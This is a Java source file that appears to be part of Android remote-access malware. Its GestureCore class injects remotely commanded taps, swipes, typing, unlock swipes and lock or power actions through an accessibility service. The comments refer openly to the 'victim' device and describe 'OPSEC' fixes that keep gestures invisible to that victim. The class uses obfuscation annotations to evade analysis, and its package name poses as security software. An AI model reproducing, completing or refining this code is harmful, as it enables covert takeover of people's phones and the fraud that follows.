package com.seguranca.protecao;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.content.Intent;
import android.graphics.Path;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.PixelFormat;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityNodeInfo;
import org.lsposed.lsparanoid.Obfuscate;

/**
 * Core isolado de injeção de gestos remotos (click, swipe, navigation, type).
 * Separado de UiAssistBridge para permitir ofuscação agressiva via R8 + LSParanoid.
 *
 * FIXES:
 *   [Bug 2] Removed show_touches=1 from constructor — was exposing every gesture as a visible
 *           ripple on the victim screen (critical OPSEC failure).
 *   [Bug 2] Gated showPhysicalTouchMarker behind DEBUG_TOUCH_MARKERS=false — overlay circles
 *           were visible on victim's screen in production.
 *   [Bug 3] executeClick stroke duration 1ms → 8ms — MIUI/OneUI/ColorOS reject strokes <~5ms
 *           with a silent false return; 8ms is safe across all vendor ROMs.
 */
@Obfuscate
public class GestureCore {

    private static final String TAG = "GestureCore";

    // ── Debug flag — NEVER enable in production builds ────────────────────────
    // When false: no overlay circles are drawn on the victim's screen.
    // When true:  cyan/pink touch markers are visible during local debugging only.
    private static final boolean DEBUG_TOUCH_MARKERS = false;

    public interface ScreenWakeDelegate {
        void wakeUpScreen();
    }

    private final AccessibilityService service;
    private final ScreenWakeDelegate wakeDelegate;
    private final Handler handler = new Handler(Looper.getMainLooper());

    public GestureCore(AccessibilityService service, ScreenWakeDelegate wakeDelegate) {
        this.service = service;
        this.wakeDelegate = wakeDelegate;
        // [Bug 2 FIX] show_touches=1 removed. Previously this called
        // Settings.System.putInt(..., "show_touches", 1) on every init,
        // permanently enabling the developer "Show touches" option on the
        // victim device so every gesture was rendered as a visible ripple.
    }

    /**
     * Processa intent PERFORM_GESTURE recebido pelo UiAssistBridge.
     */
    public void handlePerformGesture(Intent intent) {
        String action = intent.getStringExtra("action");
        Log.d(TAG, "EXECUTANDO GESTO: " + action);

        try {
            if ("BACK".equals(action)) {
                Log.d(TAG, "Executando BACK");
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
                return;
            } else if ("HOME".equals(action)) {
                Log.d(TAG, "Executando HOME");
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                return;
            } else if ("RECENTS".equals(action)) {
                Log.d(TAG, "Executando RECENTS");
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
                return;
            } else if ("WAKE_UP".equals(action) || "WAKEUP".equals(action)) {
                Log.d(TAG, "Executando WAKE_UP (somente ligar tela)");
                if (wakeDelegate != null) {
                    wakeDelegate.wakeUpScreen();
                }
                return;
            } else if ("POWER".equals(action)) {
                Log.d(TAG, "Executando POWER (toggle screen)");
                android.os.PowerManager pm = (android.os.PowerManager)
                        service.getSystemService(Context.POWER_SERVICE);
                boolean isScreenOn = pm != null && pm.isInteractive();
                if (isScreenOn) {
                    Log.d(TAG, "Tela ligada, desligando...");
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN);
                    }
                } else {
                    Log.d(TAG, "Tela desligada, acordando...");
                    if (wakeDelegate != null) {
                        wakeDelegate.wakeUpScreen();
                    }
                }
                return;
            } else if ("LOCK_SCREEN".equals(action)) {
                Log.d(TAG, "Executando LOCK_SCREEN (somente bloquear)");
                android.os.PowerManager pmLock = (android.os.PowerManager)
                        service.getSystemService(Context.POWER_SERVICE);
                if (pmLock != null && pmLock.isInteractive()) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN);
                    }
                } else {
                    Log.d(TAG, "Tela ja desligada — bypass LOCK_DEVICE");
                }
                return;
            } else if ("POWER_MENU".equals(action)) {
                Log.d(TAG, "Executando POWER_MENU");
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_POWER_DIALOG);
                }
                return;
            } else if ("NOTIFICATIONS".equals(action)) {
                Log.d(TAG, "Abrindo NOTIFICATIONS");
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS);
                return;
            } else if ("QUICK_SETTINGS".equals(action)) {
                Log.d(TAG, "Abrindo QUICK_SETTINGS");
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_QUICK_SETTINGS);
                return;
            }

            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
                Log.e(TAG, "Android versao muito antiga para gestos!");
                return;
            }

            if ("CLICK".equals(action)) {
                executeClick(intent.getIntExtra("x", 0), intent.getIntExtra("y", 0));
            } else if ("SWIPE".equals(action)) {
                executeSwipe(
                        intent.getIntExtra("x1", 0),
                        intent.getIntExtra("y1", 0),
                        intent.getIntExtra("x2", 0),
                        intent.getIntExtra("y2", 0));
            } else if ("LONG_PRESS".equals(action)) {
                executeLongPress(
                        intent.getIntExtra("x", 0),
                        intent.getIntExtra("y", 0),
                        intent.getIntExtra("duration", 500));
            } else if ("TYPE".equals(action)) {
                executeType(intent.getStringExtra("text"));
            } else if ("PATH_GESTURE".equals(action)) {
                String pathJson = intent.getStringExtra("path");
                if (pathJson != null && !pathJson.isEmpty()) {
                    try {
                        org.json.JSONArray arr = new org.json.JSONArray(pathJson);
                        int[][] points = new int[arr.length()][2];
                        for (int i = 0; i < arr.length(); i++) {
                            org.json.JSONObject pt = arr.getJSONObject(i);
                            points[i][0] = pt.getInt("x");
                            points[i][1] = pt.getInt("y");
                        }
                        executePathGesture(points);
                    } catch (Exception e) {
                        Log.e(TAG, "Erro ao parsear PATH_GESTURE: " + e.getMessage());
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao executar gesto: " + e.getMessage());
        }
    }

    private boolean dispatchGestureSafe(GestureDescription gesture, long durationMs) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N || gesture == null) return false;
        return service.dispatchGesture(gesture, null, null);
    }

    public void executeClick(int x, int y) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;

        Log.d(TAG, "CLICK em (" + x + ", " + y + ")");

        Path path = new Path();
        path.moveTo(x, y);
        path.lineTo(x, y);

        // [Bug 3 FIX] Duration changed from 1ms to 8ms.
        // MIUI (Xiaomi), OneUI (Samsung), and ColorOS (OPPO/Realme) silently reject
        // GestureDescription strokes shorter than ~5ms. 8ms is the safe minimum
        // across all major vendor ROMs while still registering as a fast tap.
        GestureDescription.StrokeDescription stroke =
                new GestureDescription.StrokeDescription(path, 0, 8);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);

        boolean dispatched = dispatchGestureSafe(builder.build(), 8);
        if (!dispatched) {
            Log.e(TAG, "Falha ao enviar CLICK!");
        }

        // [Bug 2 FIX] Touch marker is gated behind DEBUG_TOUCH_MARKERS.
        // In production (DEBUG_TOUCH_MARKERS=false) no overlay is drawn on screen.
        if (DEBUG_TOUCH_MARKERS) {
            showPhysicalTouchMarker(x, y, 400);
        }
    }

    public void swipeUpToUnlock() {
        try {
            int screenWidth = android.content.res.Resources.getSystem().getDisplayMetrics().widthPixels;
            int screenHeight = android.content.res.Resources.getSystem().getDisplayMetrics().heightPixels;
            executeSwipe(screenWidth / 2, (int)(screenHeight * 0.8), screenWidth / 2, (int)(screenHeight * 0.2), false);
        } catch (Exception e) {
            Log.e(TAG, "Erro no swipeUpToUnlock: " + e.getMessage());
        }
    }

    public void executeSwipe(int x1, int y1, int x2, int y2) {
        executeSwipe(x1, y1, x2, y2, true);
    }

    public void executeSwipe(int x1, int y1, int x2, int y2, boolean restoreTouch) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;

        Log.d(TAG, "SWIPE de (" + x1 + ", " + y1 + ") para (" + x2 + ", " + y2 + ")");

        Path path = new Path();
        path.moveTo(x1, y1);
        path.lineTo(x2, y2);

        GestureDescription.StrokeDescription stroke =
                new GestureDescription.StrokeDescription(path, 0, 250);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);

        boolean dispatched = dispatchGestureSafe(builder.build(), 250);
        if (!dispatched) {
            Log.e(TAG, "Falha ao enviar SWIPE!");
        }

        // [Bug 2 FIX] Touch markers gated behind DEBUG_TOUCH_MARKERS
        if (DEBUG_TOUCH_MARKERS) {
            showPhysicalTouchMarker(x1, y1, 300);
            showPhysicalTouchMarker(x2, y2, 400);
        }
    }

    public void executeLongPress(int x, int y, int duration) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;

        Log.d(TAG, "LONG PRESS em (" + x + ", " + y + ") por " + duration + "ms");

        Path path = new Path();
        path.moveTo(x, y);

        GestureDescription.StrokeDescription stroke =
                new GestureDescription.StrokeDescription(path, 0, duration);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);

        boolean dispatched = dispatchGestureSafe(builder.build(), duration);
        if (!dispatched) {
            Log.e(TAG, "Falha ao enviar LONG PRESS!");
        }

        // [Bug 2 FIX] Touch markers gated behind DEBUG_TOUCH_MARKERS
        if (DEBUG_TOUCH_MARKERS) {
            showPhysicalTouchMarker(x, y, duration + 200);
        }
    }

    public void executePathGesture(int[][] points) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;
        if (points == null || points.length < 2) {
            Log.e(TAG, "PATH_GESTURE precisa de pelo menos 2 pontos");
            return;
        }

        Log.d(TAG, "PATH_GESTURE com " + points.length + " pontos");

        Path path = new Path();
        path.moveTo(points[0][0], points[0][1]);
        for (int i = 1; i < points.length; i++) {
            path.lineTo(points[i][0], points[i][1]);
        }

        long totalDuration = Math.max(60L, (points.length - 1) * 40L);

        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, totalDuration);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);

        boolean dispatched = dispatchGestureSafe(builder.build(), totalDuration);
        if (!dispatched) {
            Log.e(TAG, "Falha ao enviar PATH_GESTURE!");
        }
    }

    private AccessibilityNodeInfo findEditableNode(AccessibilityNodeInfo node) {
        if (node == null) return null;
        if (node.isEditable() && (node.isFocused() || node.isVisibleToUser())) {
            return node;
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            AccessibilityNodeInfo res = findEditableNode(child);
            if (res != null) {
                return res;
            }
        }
        return null;
    }

    public void executeType(String text) {
        Log.d(TAG, "Tentando digitar: " + text);

        AccessibilityNodeInfo rootNode = service.getRootInActiveWindow();
        if (rootNode == null) {
            Log.e(TAG, "Nao conseguiu obter rootNode para digitar");
            return;
        }

        AccessibilityNodeInfo focusedNode = rootNode.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
        if (focusedNode == null) {
            focusedNode = findEditableNode(rootNode);
        }

        if (focusedNode != null && focusedNode.isEditable()) {
            Bundle arguments = new Bundle();
            arguments.putCharSequence(
                    AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
            boolean success = focusedNode.performAction(
                    AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);

            if (success) {
                Log.d(TAG, "Texto digitado com sucesso!");
            } else {
                Log.e(TAG, "Falha ao digitar texto");
            }

            focusedNode.recycle();
        } else {
            Log.e(TAG, "Nenhum campo de texto focado encontrado");
        }

        rootNode.recycle();
    }

    /**
     * Draws a debug touch marker overlay on the physical screen.
     * Only called when DEBUG_TOUCH_MARKERS = true.
     * In production builds this method is unreachable.
     */
    public void showPhysicalTouchMarker(int x, int y, int durationMs) {
        if (service == null) return;
        handler.post(() -> {
            try {
                WindowManager wm = (WindowManager) service.getSystemService(Context.WINDOW_SERVICE);
                if (wm == null) return;

                final View touchView = new View(service) {
                    private final Paint paintOuter = new Paint(Paint.ANTI_ALIAS_FLAG);
                    private final Paint paintInner = new Paint(Paint.ANTI_ALIAS_FLAG);
                    {
                        paintOuter.setColor(Color.parseColor("#00F0FF"));
                        paintOuter.setStyle(Paint.Style.STROKE);
                        paintOuter.setStrokeWidth(8f);

                        paintInner.setColor(Color.parseColor("#FF0077"));
                        paintInner.setStyle(Paint.Style.FILL);
                    }

                    @Override
                    protected void onDraw(Canvas canvas) {
                        super.onDraw(canvas);
                        float cx = getWidth() / 2f;
                        float cy = getHeight() / 2f;
                        canvas.drawCircle(cx, cy, cx - 6f, paintOuter);
                        canvas.drawCircle(cx, cy, cx / 3.5f, paintInner);
                    }
                };

                int size = 100;
                int layoutType = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                        ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                        : WindowManager.LayoutParams.TYPE_PHONE;

                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        size, size,
                        layoutType,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                                | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                                | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                        PixelFormat.TRANSLUCENT
                );

                params.gravity = Gravity.TOP | Gravity.LEFT;
                params.x = x - (size / 2);
                params.y = y - (size / 2);

                wm.addView(touchView, params);

                handler.postDelayed(() -> {
                    try {
                        wm.removeView(touchView);
                    } catch (Exception ignored) {}
                }, durationMs);

            } catch (Exception e) {
                Log.e(TAG, "Erro ao desenhar indicador de debug: " + e.getMessage());
            }
        });
    }
}                         
